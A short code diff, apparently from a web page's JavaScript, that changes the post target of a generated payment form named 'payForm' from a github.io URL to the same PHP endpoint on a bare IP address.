@@ -51,7 +51,7 @@
     form.setAttribute("charset", "UTF-8");
     form.setAttribute("name", "payForm");
     form.setAttribute("method", "post");
-    form.setAttribute("action", "https://rtcsa2024.github.io/kgmob_finish.php");
+    form.setAttribute("action", "https://54.160.128.164/kgmob_finish.php");
     
     var hiddenField = document.createElement("input");
     hiddenField.setAttribute("type", "hidden");
